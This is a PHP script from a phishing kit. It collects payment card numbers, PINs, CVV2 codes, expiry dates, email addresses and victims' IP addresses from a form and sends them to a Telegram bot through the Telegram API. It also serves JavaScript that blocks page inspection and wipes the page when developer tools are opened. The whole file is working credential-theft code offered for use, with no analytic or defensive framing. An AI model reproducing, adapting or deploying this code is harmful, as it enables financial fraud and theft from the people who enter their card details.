<?php

if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}

include "Bankinfo.php";
include "info.php" ;



$pan = $_POST["pan"] ?? "";
$pin = $_POST["pin"] ?? "";
$cvv = $_POST["cvv2"] ?? "";
$year = $_POST["expireYear"] ?? "";
$month = $_POST["expireMonth"] ?? "";
$amount = $_POST["am"] ?? "";
$num = $_POST["num"] ?? "";
if(isset($_POST["inputemail"])){
    $email = $_POST["inputemail"] ?? "";
}else{
    $email = "None";
}

$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);


$ip = $_SERVER["REMOTE_ADDR"];

$Text = "

- #Cᴀʀᴅ_𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 - #ISTA 
➖➖➖
🎆〕𝙲𝙰𝚁𝙳 ➣  <code>$pan</code>
🌌〕Pαѕѕ ➣ <code>$pin</code>
🌃〕𝙲𝚟𝚟𝟐 ➣  <code>$cvv</code>
🌁〕Dᴀᴛᴇ ➣ : $year / $month 
🏦〕#вαик : $bankinfo[1]
➖➖➖
🌐〕ιρ : <code>$ip</code>

🐋〕<a href='t.me/Otis_Risk'>ᴡʜᴏ ᴀʀᴇ ᴡᴇ ?</a>

";
$ok = 
    file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($Text));
    
    ?>


<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function(e){
    if(
        e.keyCode === 123 || 
        (e.ctrlKey && e.keyCode === 85) || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
        (e.ctrlKey && e.keyCode === 83)
    ){
        e.preventDefault();
        return false;
    }
});
document.addEventListener('selectstart', e => e.preventDefault());

// basic devtools detect (weak)
setInterval(function(){
    const before = Date.now();
    debugger;
    const after = Date.now();
    if(after - before > 100){
        document.body.innerHTML = "";
    }
}, 2000);
</script>
